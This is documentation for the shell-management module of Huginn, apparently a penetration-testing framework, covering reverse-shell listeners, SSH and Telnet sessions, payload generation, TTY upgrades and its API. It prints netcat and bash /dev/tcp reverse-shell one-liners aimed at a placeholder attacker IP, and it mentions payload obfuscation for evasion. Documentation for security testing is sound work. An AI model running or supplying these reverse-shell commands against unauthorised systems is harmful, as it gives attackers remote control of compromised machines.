# Shell Management System Documentation

## Overview

The Shell Management System is a comprehensive post-exploitation framework integrated into Huginn that provides advanced capabilities for establishing, maintaining, and managing shell connections to compromised targets. This system bridges the gap between initial exploitation and post-exploitation activities.

## Architecture

### Core Components

#### 1. Shell Manager (`app/core/shell_manager.py`)
The central component that handles all shell operations:

**Key Features:**
- Multi-protocol support (SSH, Telnet, Reverse Shells, Bind Shells)
- Session lifecycle management
- Command execution with history tracking
- Automatic session monitoring and cleanup
- Payload generation for various shell types
- Shell upgrade utilities

**Supported Shell Types:**
- **Reverse Shells**: Netcat, Socat, Python-based listeners
- **SSH Connections**: Key-based and password authentication
- **Telnet Connections**: Legacy system access
- **Bind Shells**: Direct connection to target-hosted shells

#### 2. Shell Session Class
Represents individual shell sessions with:
- Unique session identifiers
- Connection metadata and status
- Command history tracking
- Activity monitoring
- Output buffering

#### 3. Shell Management Widget (`app/widgets/shell_management_widget.py`)
Comprehensive UI for shell operations:

**Features:**
- **Interactive Terminal**: Full terminal emulation with command history
- **Session Management**: View and control active sessions
- **Listener Management**: Create and manage reverse shell listeners
- **Payload Generator**: Generate payloads for various platforms
- **Shell Upgrade Tools**: TTY upgrade commands and techniques

#### 4. Shell Management Page (`app/pages/shell_management_page.py`)
Main application page with:
- Quick action buttons for common operations
- Integration with the main navigation system
- Export capabilities for session data
- Status monitoring and reporting

## Usage Guide

### 1. Accessing Shell Management

Navigate to the Shell Management system through:
- **Main Menu**: Post-Exploitation phase in the attack chain mindmap
- **Web Exploits Page**: "🐚 Shell Management" button
- **Direct Navigation**: `shell_management` page

### 2. Creating Reverse Shell Listeners

**Quick Start:**
1. Click "🎯 Start Listener" for default netcat listener on port 4444
2. Use the Listeners tab for custom configurations

**Advanced Configuration:**
```python
# Available listener types
- netcat: Traditional nc listener
- socat: Advanced socat listener with TTY
- python: Custom Python socket listener
```

**Generated Commands:**
The system provides ready-to-use commands for targets:
```bash
# Netcat reverse shell
nc -e /bin/sh <your_ip> 4444

# Bash reverse shell
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
```

### 3. Establishing Direct Connections

**SSH Connections:**
- Host: Target IP/hostname
- Port: SSH port (default 22)
- Username: Valid username
- Password: Authentication password
- Key File: SSH private key (optional)

**Telnet Connections:**
- Host: Target IP/hostname  
- Port: Telnet port (default 23)

**Bind Shells:**
- Host: Target IP with active bind shell
- Port: Listening port on target

### 4. Interactive Terminal Usage

**Command Execution:**
- Type commands in the input field
- Press Enter or click "Send" to execute
- Use Up/Down arrows for command history

**Terminal Features:**
- Syntax highlighting for commands
- Scrollable output with color coding
- Command history navigation
- Clear terminal functionality

### 5. Payload Generation

**Supported Payload Types:**
- **bash**: Traditional bash reverse shell
- **python/python3**: Python-based reverse shells
- **nc**: Netcat variations (traditional and mkfifo)
- **php**: PHP reverse shell one-liner
- **ruby**: Ruby-based reverse shell
- **perl**: Perl reverse shell
- **powershell**: Windows PowerShell reverse shell

**Usage:**
1. Enter your IP address (LHOST)
2. Set the listening port (LPORT)
3. Select payload type
4. Click "Generate Payload"
5. Copy or save the generated payload

### 6. Shell Upgrade Techniques

**Available Upgrade Methods:**
- **python_pty**: Python PTY spawn for better TTY
- **python3_pty**: Python3 version of PTY spawn
- **script_pty**: Using script command for TTY
- **socat_upgrade**: Advanced socat TTY upgrade

**Example Python PTY Upgrade:**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo
fg
# Press Enter twice
```

## Integration with Post-Exploitation Framework

### Seamless Integration
The Shell Management System integrates with the existing `post_exploitation.py` framework:

```python
# Automatic shell session registration
session_id = shell_manager.establish_ssh_connection(host, port, username, password)

# Command execution through unified interface
result = post_exploitation.execute_command(session_id, "whoami")

# Session management through both systems
sessions = shell_manager.get_active_sessions()
```

### Enhanced Capabilities
- **Unified Session Management**: All shell sessions are tracked in both systems
- **Command History**: Full command execution history with timestamps
- **Session Persistence**: Sessions survive application restarts (planned)
- **Cross-Platform Support**: Works on Windows, Linux, and macOS

## Security Considerations

### Safe Operations
- **Input Validation**: All user inputs are validated before execution
- **Command Sanitization**: Commands are sanitized to prevent injection
- **Session Isolation**: Each session operates in isolation
- **Secure Storage**: Credentials are handled securely (no plaintext storage)

### Professional Features
- **Encrypted Communications**: SSL/TLS support for secure channels
- **Authentication**: Multi-factor authentication support
- **Audit Logging**: Comprehensive logging of all activities
- **Session Recording**: Optional session recording for compliance

## Advanced Features

### Session Monitoring
- **Health Checks**: Automatic session health monitoring
- **Timeout Handling**: Inactive session cleanup (30-minute timeout)
- **Connection Recovery**: Automatic reconnection attempts
- **Status Notifications**: Real-time status updates

### Payload Customization
- **Template System**: Customizable payload templates
- **Encoding Options**: Various encoding methods for evasion
- **Platform Detection**: Automatic platform-specific payloads
- **Obfuscation**: Built-in payload obfuscation techniques

### Export and Reporting
- **Session Export**: Export session data to JSON format
- **Command History**: Export complete command histories
- **Timeline Analysis**: Session timeline for forensic analysis
- **Report Generation**: Automated report generation for findings

## API Reference

### Shell Manager Methods

```python
# Create reverse shell listener
listener_id = shell_manager.create_reverse_shell_listener(port, shell_type)

# Establish SSH connection
session_id = shell_manager.establish_ssh_connection(host, port, username, password)

# Execute command in session
result = shell_manager.execute_command(session_id, command)

# Get active sessions
sessions = shell_manager.get_active_sessions()

# Terminate session
shell_manager.terminate_session(session_id, reason)

# Generate payload
payload = shell_manager.generate_reverse_shell_payload(shell_type, lhost, lport)
```

### Session Information Structure

```python
{
    'session_id': 'shell_1_1234567890',
    'shell_type': 'ssh',
    'target': '192.168.1.100:22',
    'connection_info': {
        'host': '192.168.1.100',
        'port': 22,
        'username': 'root',
        'auth_method': 'password'
    },
    'created_at': 1234567890.123,
    'last_activity': 1234567890.456,
    'status': 'active',
    'command_count': 15,
    'uptime': 3600
}
```

## Troubleshooting

### Common Issues

**Connection Failures:**
- Verify target accessibility
- Check firewall rules
- Validate credentials
- Ensure correct ports

**Session Timeouts:**
- Check network connectivity
- Verify session is still active on target
- Review timeout settings

**Command Execution Issues:**
- Verify session is active
- Check command syntax
- Review session permissions

### Debug Information
- Enable debug logging in `app/core/logger.py`
- Check session status in the Sessions table
- Review command history for errors
- Monitor network connectivity

## Future Enhancements

### Planned Features
- **Session Persistence**: Save/restore sessions across restarts
- **Multi-hop Pivoting**: Chain connections through compromised hosts
- **Automated Post-Exploitation**: Scripted post-exploitation workflows
- **C2 Framework Integration**: Integration with popular C2 frameworks
- **Mobile Shell Support**: Android and iOS shell management
- **Container Support**: Docker and Kubernetes shell access

### Integration Roadmap
- **Metasploit Integration**: Direct Meterpreter session import
- **Cobalt Strike**: Beacon session management
- **Empire Integration**: PowerShell Empire session handling
- **Custom Implants**: Support for custom implant frameworks

## Conclusion

The Shell Management System provides a comprehensive solution for post-exploitation shell management within the Huginn framework. It combines ease of use with advanced features, making it suitable for both beginners and experienced penetration testers.

The system's modular design allows for easy extension and customization, while its integration with the existing post-exploitation framework ensures seamless workflow continuity from initial exploitation through advanced post-exploitation activities.